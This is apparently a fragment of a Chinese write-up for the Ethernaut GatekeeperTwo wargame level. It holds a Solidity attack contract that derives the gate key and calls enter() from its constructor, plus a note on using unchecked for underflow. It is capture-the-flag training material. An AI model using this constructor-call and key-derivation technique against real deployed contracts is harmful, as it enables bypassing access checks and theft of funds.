interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwo {
    address levelInstance;
    
    constructor(address _levelInstance) {
      levelInstance = _levelInstance;
      unchecked{
          bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1  );
          IGatekeeperTwo(levelInstance).enter(key);
      }
    }
}
```

由于新版本的solidity都会内置整数溢出检查，所以在攻击合约中`uint64(0) - 1`需要用uncheck修饰。
